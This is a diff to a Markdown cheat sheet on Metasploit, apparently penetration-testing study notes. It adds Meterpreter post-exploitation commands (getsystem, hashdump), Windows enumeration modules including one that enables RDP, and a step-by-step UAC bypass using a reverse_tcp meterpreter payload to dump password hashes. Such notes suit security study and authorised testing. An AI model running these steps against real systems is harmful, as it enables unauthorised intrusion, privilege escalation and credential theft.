@@ -10,7 +10,7 @@ Metasploit Framework
 	5. The Penetration Testing Execution Standard (PTES)
 3. [Usage](#Usage)
 	1. nmap importing or running scan
-	2. Auxiliary Modules
+	2. [Auxiliary Modules](#Auxiliary_Modules)
 	3. [Workflow Examples](#Workflow_Examples)
 		1. [FTP](#FTP)
 		2. [SMB](#SMB)
@@ -19,6 +19,10 @@ Metasploit Framework
 		5. [SMTP](#SMTP)
 	4. [Vulnerability Scanning](#Vulnerability_Scanning)
 	5. [Meterpreter](#Meterpreter)
+		1. [Post exploitation](#Post_Exploitation)
+		2. [Post Modules](#Post_Modules)
+		3. [UAC Bypass](#UAC_Bypass)
+		4. Upgrade shell to meterpreter
 	6. [msfvenom](#msfvenom)
 	7. Automation
 	8. Show information gathered
@@ -101,7 +105,7 @@ http://www.pentest-standard.org/index.php/Main_Page
 - `db_nmap -Pn -sV -O` : run and import an nmap scan 
 - You can import from a nessus scan ScanFile.nessus
 
-## Auxiliary Modules
+## Auxiliary_Modules
 - `search portscan` : bring up scanner modules
 - `use auxiliary/scanner/portscan/tcp`
 - `show options` : check the options
@@ -228,8 +232,8 @@ Finding vulnerabilities that can be exploited
 ---
 
 ## Meterpreter
-### Post exploitation
-In a meterpreter session
+### Post_Exploitation
+*In a meterpreter session*
 - `sysinfo` : system info
 - `getuid` : get user info
 - `help` : display commands
@@ -243,6 +247,40 @@ In a meterpreter session
 - `ps` : show processes running
 - `migrate 580` : try to migrate to the process "PID" at 580, based on privileges
 - `execute -f ifconfig` : execute a command
+- `getsystem` : try to get higher privilege
+- `hashdump` : dump user hashes
+- `showmount` : show hard drives
+
+### Post_Modules
+*Useful Modules Examples*
+- `search migrate` : look for migrate modules
+- `post/windows/gather/win_privs` : shows privileges you have
+- `post/windows/gather/enum_logged_on_users` : shows logged in users and SID
+- `post/windows/gather/checkvm` : check if VM
+- `post/windows/gather/enum_applications` : check installed apps and versions
+- `post/windows/gather/enum_av_excluded` : find excluded folders
+- `post/windows/gather/enum_computers` : find domain computers
+- `post/windows/gather/enume_patches` : find patches
+	- `shell` : then run `systeminfo` to gather manually
+- `post/windows/gather/enum_shares` : find shares
+- `post/windows/manage/enable_rdp` : turn on RDP
+
+### UAC_Bypass
+*Example flow*
+1. get meterpreter on host and attempt `getsystem`, doesn't work
+2. drop to `shell`, `net users` : check users on system to find users
+3. `net localgroup administrators` : find users that are administrators
+	1. current user is part of group! 
+	2. kill shell
+4. `search bypassuac` : a lot of modules here
+5. `use /exploit/windows/local/bypassuac_injection` : set module
+	1. `set payload windows/x64/meterpreter/reverse_tcp` : set payload
+	2. `set SESSION 1` : set session to run on
+	3. `set LPORT 4433` : session already using the default 4444
+	4. `set TARGET Windows\ x64` : tab completion helps
+	5. `run` : should run and open another session on target
+	6. `getsystem` : should now work on first session
+	7. `hashdump` : yay
 
 ### Upgrade shell to meterpreter
 1. `sessions -u 1` : Auto upgrade cmd shell at session 1 to meterpreter
@@ -316,6 +354,8 @@ Depends on workspace and modules ran within
 - `hosts`
 - `services`
 - `loot` : shows stuff like schema gathered
+	- post gather modules auto-collect data
+	- `~/.msf4/loot` : storage location
 - `creds` : shows credentials
 - `vulns -p 445` : can show discovered vulnerabilities and filter by port
 - `search cve:2017 name:smb` : search for cve year and name
